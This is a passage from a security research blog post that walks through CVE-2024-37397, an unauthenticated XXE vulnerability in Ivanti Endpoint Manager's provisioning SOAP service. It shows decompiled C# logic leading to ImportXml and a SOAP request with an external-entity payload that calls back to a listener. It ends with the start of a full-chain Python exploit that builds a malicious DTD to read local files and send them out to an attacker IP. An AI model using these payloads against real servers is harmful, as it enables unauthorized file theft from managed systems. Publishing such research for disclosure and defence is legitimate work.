</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (historyEntryStateType == HistoryEntryStateType.NEED_REBOOT)
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						historyEntryStateType = HistoryEntryStateType.REBOOTING;
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">bool</span> flag3 = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">bool</span> flag4 = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">bool</span> flag5 = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">bool</span> flag6 = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (flag2)
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (historyEntryStateType == HistoryEntryStateType.FAILED &amp;&amp; phistoryEntry.MustSucceed)
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						flag = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (historyEntryIDN == -<span style="color:#ae81ff">1</span> &amp;&amp; nextHistoryEntryIDN == -<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						flag = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (OleDbHelper.IsValidIdnRange(phistoryEntry.Id))
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						flag3 = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>						flag4 = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">if</span> (OleDbHelper.IsValidIdnRange(phistoryEntry2.Id))
</span></span><span style="display:flex;"><span>						{
</span></span><span style="display:flex;"><span>							flag5 = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>						}
</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (historyEntryStateType != HistoryEntryStateType.MIGHT_REBOOT &amp;&amp; historyEntryStateType != HistoryEntryStateType.REBOOTING &amp;&amp; historyEntryStateType != HistoryEntryStateType.WAITINGONSWD)
</span></span><span style="display:flex;"><span>						{
</span></span><span style="display:flex;"><span>							flag = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>						}
</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (actionXml != <span style="color:#66d9ef">null</span> &amp;&amp; actionXml.Length &gt; <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>						{
</span></span><span style="display:flex;"><span>							flag5 = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>							flag6 = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>						}
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">bool</span> flag7 = <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (flag3)
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					phistoryEntry.TimestampUTC = utcNow;
</span></span><span style="display:flex;"><span>					phistoryEntry.State = historyEntryStateType;
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (phistoryEntry.State != HistoryEntryStateType.MIGHT_REBOOT &amp;&amp; phistoryEntry.State != HistoryEntryStateType.REBOOTING)
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						phistoryEntry.IntReturnValue = internalRetval;
</span></span><span style="display:flex;"><span>						phistoryEntry.ExtReturnValue = externalRetval;
</span></span><span style="display:flex;"><span>						Encoding ascii = Encoding.ASCII;
</span></span><span style="display:flex;"><span>						phistoryEntry.Blob = ascii.GetBytes(strCapturedText);
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>					flag7 = phistoryEntry.Commit();
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (!flag7)
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						err = <span style="color:#66d9ef">new</span> PError(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>, PBL.DEBUGLOC, phistoryEntry.Error);
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (flag4)
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">int</span> historyEntryIdn = phistoryTask.HistoryEntryId;
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (OleDbHelper.IsValidIdnRange(phistoryEntry2.Id))
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						historyEntryIdn = phistoryEntry2.Id;
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">try</span>
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						OleDbHelper.BeginTransaction();
</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">int</span> rv = HistoryTask.UpdateRow(phistoryTask.Id, historyEntryIdn, utcNow);
</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">if</span> (!OleDbHelper.IsGoodUpdateReturnValue(rv))
</span></span><span style="display:flex;"><span>						{
</span></span><span style="display:flex;"><span>							err = <span style="color:#66d9ef">new</span> PError(<span style="color:#e6db74">&#34;L10n.Provisioning.Error.DatabaseError&#34;</span>, <span style="color:#66d9ef">null</span>, PBL.DEBUGLOC, err);
</span></span><span style="display:flex;"><span>							flag7 = <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>						}
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">finally</span>
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						OleDbHelper.CommitTransaction();
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (flag6 &amp;&amp; actionXml != <span style="color:#66d9ef">null</span> &amp;&amp; actionXml.Length &gt; <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					PHistoryEntry phistoryEntry3 = <span style="color:#66d9ef">new</span> PHistoryEntry();
</span></span><span style="display:flex;"><span>					flag7 = phistoryEntry3.ImportXml(actionXml);
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (!flag7)
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						err = <span style="color:#66d9ef">new</span> PError(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>, PBL.DEBUGLOC, phistoryEntry3.Error);
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>					ArrayList arrayList = <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>					flag7 = PHistoryEntry.Read(phistoryTask.Template.Id, phistoryEntry.HistoryTaskId, <span style="color:#66d9ef">out</span> arrayList, <span style="color:#66d9ef">ref</span> err);
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (flag7)
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>						phistoryEntry3.Name = L10n.GetString(<span style="color:#e6db74">&#34;HistoryEntry.InjectedActionName&#34;</span>);
</span></span><span style="display:flex;"><span>						phistoryEntry3.HistoryTaskId = phistoryTask.Id;
</span></span><span style="display:flex;"><span>						phistoryEntry3.SectionId = phistoryEntry.SectionId;
</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">object</span> obj <span style="color:#66d9ef">in</span> arrayList)
</span></span><span style="display:flex;"><span>						{
</span></span><span style="display:flex;"><span>							PHistoryEntry phistoryEntry4 = (PHistoryEntry)obj;
</span></span><span style="display:flex;"><span>							<span style="color:#66d9ef">if</span> (phistoryEntry4.SectionId == phistoryEntry.SectionId)
</span></span><span style="display:flex;"><span>							{
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">[..snip..]</span>
</span></span></code></pre></div><p>This is rather a very large function to analyze but luckily, I managed to bring it down to certain simplicity. But before that, let&rsquo;s check it&rsquo;s POST request and the actual data we have to sent to the application as part of our HTTP request. Given that we know the service is running on port 8443 and we have IIS manager insalled on our Windows Server, we can navigate within the IIS Manager and find the <code>ProvisioningWebService</code> path and then attempt to reach it from browser.</p>
<p>If you have ever come across any of the writeups related to Ivanti Endpoint Manager, you would know majority of them is done through SOAP API and this is not exception. One good thing about SOAP APIs is that it will list the methods supported by the API and give us sample request and an example response to work with.</p>
<p>Now, that we have a sample <code>SetActionStatus</code> request to work with, let&rsquo;s see how exactly we can reach our targeted function.</p>
<h3 id="overcoming-obstacles-challenges-in-exploiting-xxe">Overcoming Obstacles: Challenges in Exploiting XXE</h3>
<p>Now, let&rsquo;s dive deeper into analyzing the logic of WriteActionStatus to reach the part where the ImportXml function is called. Instead of going line by line through the code, we’ll focus on the main checkpoints that lead us to ImportXml.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (flag6 &amp;&amp; actionXml != <span style="color:#66d9ef">null</span> &amp;&amp; actionXml.Length &gt; <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			PHistoryEntry phistoryEntry3 = <span style="color:#66d9ef">new</span> PHistoryEntry();
</span></span><span style="display:flex;"><span>			flag7 = phistoryEntry3.ImportXml(actionXml);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (!flag7)
</span></span></code></pre></div><p>First, the <code>historyEntryIDN</code> must be valid. This kicks off a series of database lookups involving history tasks and entries. These values are retrieved based on the initial <code>historyEntryIDN</code>. If all validations pass and flag2 remains true, the next significant check involves <code>actionXml</code>. The logic behind <code>flag6</code> is simple—it checks if <code>actionXml</code> is empty. If it’s not, this sets up the possibility of calling ImportXml.</p>
<p>However, before reaching that point, other conditions must be satisfied, such as ensuring the history entry’s state isn’t in a &ldquo;stale&rdquo; mode (like rebooting or waiting for software delivery). Provided these conditions hold true and <code>flag6</code> is set, we finally encounter the block that executes <code>ImportXml</code>. At this point, <code>flag6</code> confirms that <code>actionXml</code> contains valid data, allowing us to pass the final check and proceed with the import.</p>
<blockquote>
<p>Note: I had to make my own entries within the database to get through the check of <code>historyEntryIDN</code>. I had the ID as <code>5</code> into the database, so we will be using that in our exploit but rest assured there is a way to get through it when attacking a real target.</p></blockquote>
<h3 id="exploiting-xxe-turning-theory-into-action">Exploiting XXE: Turning Theory Into Action</h3>
<p>Now, it is time we get our hands dirty. Let&rsquo;s paste the sample request:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;soap:Envelope</span> <span style="color:#a6e22e">xmlns:xsi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span style="color:#a6e22e">xmlns:xsd=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span style="color:#a6e22e">xmlns:soap=</span><span style="color:#e6db74">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;soap:Body&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;SetActionStatus</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://tempuri.org/&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;historyTaskIDN&gt;</span>100<span style="color:#f92672">&lt;/historyTaskIDN&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;historyEntryIDN&gt;</span>5<span style="color:#f92672">&lt;/historyEntryIDN&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;nextHistoryEntryIDN&gt;</span>0<span style="color:#f92672">&lt;/nextHistoryEntryIDN&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;actionState&gt;</span>NEED_REBOOT<span style="color:#f92672">&lt;/actionState&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;internalRetval&gt;</span>1<span style="color:#f92672">&lt;/internalRetval&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;externalRetval&gt;</span>1<span style="color:#f92672">&lt;/externalRetval&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;strCapturedText&gt;</span>string<span style="color:#f92672">&lt;/strCapturedText&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;Variables&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;UserVariable&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;Name&gt;</span>string<span style="color:#f92672">&lt;/Name&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;Value&gt;</span>string<span style="color:#f92672">&lt;/Value&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;VariableOperation&gt;</span>add<span style="color:#f92672">&lt;/VariableOperation&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;/UserVariable&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;UserVariable&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;Name&gt;</span>string<span style="color:#f92672">&lt;/Name&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;Value&gt;</span>string<span style="color:#f92672">&lt;/Value&gt;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&lt;VariableOperation&gt;</span>add<span style="color:#f92672">&lt;/VariableOperation&gt;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;/UserVariable&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;/Variables&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;actionXml&gt;</span><span style="color:#75715e">&lt;![CDATA[
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &#34;http:///192.168.1.44:8000&#34;&gt; ]&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  &lt;data&gt;&amp;example;&lt;/data&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  ]]&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/actionXml&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/SetActionStatus&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/soap:Body&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/soap:Envelope&gt;</span>
</span></span></code></pre></div><p>Observing the request within the Burp Suite showed a 200 response and we observe a hit on our listener:</p>
<p><img src="/img/ivanti-cve-2024-37397/xxe-showcase.jpg" alt="XXE Exploit Sample - Burp Suite"></p>
<h1 id="crafting-the-final-exploit">Crafting the Final Exploit</h1>
<p>From the previous analysis, we understood that a valid <code>historyEntryID</code> is required to perform the <code>SetActionStatus</code> action. Like most exploits, my aim was to minimize dependencies on pre-existing data. In this case, we can leverage the <code>GetTasksXml</code> method to retrieve valid IDs and use them in the <code>SetActionStatus</code> request alongside our XXE payload, leading to the final exploit.</p>
<p>The final exploit combines the <code>GetTasksXml</code> and <code>SetActionStatus</code> requests. Essentially, <code>GetTasksXml</code> retrieves the valid <code>historyEntryID</code>, which is then used in the <code>SetActionStatus</code> request containing the XXE payload. Unfortunately, at the time of writing, the installed version had a license expiration issue, making reinstallation more complex than expected. However, the final exploit can be found <a href="https://github.com/D4mianWayne/POCs/blob/main/CVE%202024-37397/CVE-2024-37397-Final-Full-Chain.py">here</a> and is also pasted below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># ---------------------------------------------------------</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Title: Ivanti Endpoint Manager Unauthorized XXE Exploit</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># CVE: CVE-2024-37397</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Date: 2024-09-17</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Author: @D4mianWayne</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Vulnerability Discovered by: 06fe5fd2bc53027c4a3b7e395af0b850e7b8a044 (Trend Micro)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Vendor Homepage: https://www.ivanti.com/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Software Link: https://www.ivanti.com/products/ivanti-endpoint-manager</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Version: Affected versions [mention affected versions]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tested on: Ivanti Endpoint Manager version X.X.X</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># CVE Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-37397</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ---------------------------------------------------------</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib3
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> xml.etree.ElementTree <span style="color:#66d9ef">as</span> ET
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_banner</span>():
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;=&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">50</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;     Exploit Script for CVE-2024-37397&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;     Unauthorized XXE Exploit in Ivanti Endpoint Manager&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;=&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">50</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;     Created by @D4mianWayne&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;     Date: 2024-09-17&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;=&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">50</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Call the function to display the banner</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">log</span>(message, status<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;info&#34;</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> status <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;success&#34;</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] </span><span style="color:#e6db74">{</span>message<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> status <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;log&#34;</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] </span><span style="color:#e6db74">{</span>message<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[-] </span><span style="color:#e6db74">{</span>message<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Function to create the malicious DTD file since this is a blind XXE so we are performing an</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># OOB XXE attack and exfiltrate data</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_malicious_dtd</span>(file_path, local_ip):
</span></span><span style="display:flex;"><span>    dtd_content <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;&lt;!ENTITY % file SYSTEM &#34;file:///</span><span style="color:#e6db74">{</span>file_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http://</span><span style="color:#e6db74">{</span>local_ip<span style="color:#e6db74">}</span><span style="color:#e6db74">:4444/?content=%file;&#39;&gt;&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">%eval;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">%exfiltrate;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;malicious.dtd&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> dtd_file:
</span></span><span style="display:flex;"><span>        dtd_file<span style="color:#f92672">.</span>write(dtd_content)
</span></span><span style="display:flex;"><span>    log(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Malicious DTD created at malicious.dtd&#34;</span>, <span style="color:#e6db74">&#34;success&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getTasksXml</span>(target_url):
</span></span><span style="display:flex;"><span>  log(<span style="color:#e6db74">&#34;Attempting to retrieve historyEntryIDN via getTasksXml&#34;</span>, <span style="color:#e6db74">&#34;log&#34;</span>)
</span></span><span style="display:flex;"><span>  headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;text/xml; charset=utf-8&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Soapaction&#34;</span>: <span style="color:#e6db74">&#39;&#34;http://tempuri.org/GetTaskXml&#34;&#39;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  soap_request <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;soap:Envelope xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xmlns:soap=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;soap:Body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;GetTaskXml xmlns=&#34;http://tempuri.org/&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;sids&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;ServerIdentifier&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              &lt;sit&gt;Test&lt;/sit&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              &lt;sIdentifier&gt;string&lt;/sIdentifier&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/ServerIdentifier&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;ServerIdentifier&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              &lt;sit&gt;Test&lt;/sit&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              &lt;sIdentifier&gt;string&lt;/sIdentifier&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/ServerIdentifier&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          &lt;/sids&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/GetTaskXml&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &lt;/soap:Body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/soap:Envelope&gt;&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/LANDesk/ManagementSuite/Core/ProvisioningWebService/WebService.asmx&#34;</span><span style="color:#f92672">.</span>format(target_url), data<span style="color:#f92672">=</span>soap_request, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>  root <span style="color:#f92672">=</span> ET<span style="color:#f92672">.</span>fromstring(response<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>  namespace <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;ns&#39;</span>: <span style="color:#e6db74">&#39;http://tempuri.org/&#39;</span>}
</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> root<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;.//ns:GetTaskXmlResult&#39;</span>, namespace)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> result <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result<span style="color:#f92672">.</span>text
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>      log(<span style="color:#e6db74">&#34;GetTaskXmlResult not found&#34;</span>, <span style="color:#e6db74">&#34;error&#34;</span>)
</span></span><span style="display:flex;"><span>      exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># SOAP Request for invoking SetActionStatus, a valid historyEntryIDN is required for certain checks to be </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># fulfilled but I believe it can be bruteforced to work. Additionally, the actionXml content are being passed to the</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ImportXml function which was found to be vulnerable to XXE as XmlUrlXmlResolver wasn&#39;t set to null explicitly.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_soap_request</span>(target_url, local_ip):
</span></span><span style="display:flex;"><span>  historyEntryIDN <span style="color:#f92672">=</span> getTasksXml(target_url)
</span></span><span style="display:flex;"><span>  log(<span style="color:#e6db74">&#34;Retrieved historyEntryIDN </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(historyEntryIDN), <span style="color:#e6db74">&#34;success&#34;</span>)
</span></span><span style="display:flex;"><span>  log(<span style="color:#e6db74">&#34;Crafting SOAP Request to invole SetActionStatus&#34;</span>, <span style="color:#e6db74">&#34;log&#34;</span>)
</span></span><span style="display:flex;"><span>  soap_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &lt;soap:Envelope xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xmlns:soap=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;soap:Body&gt;
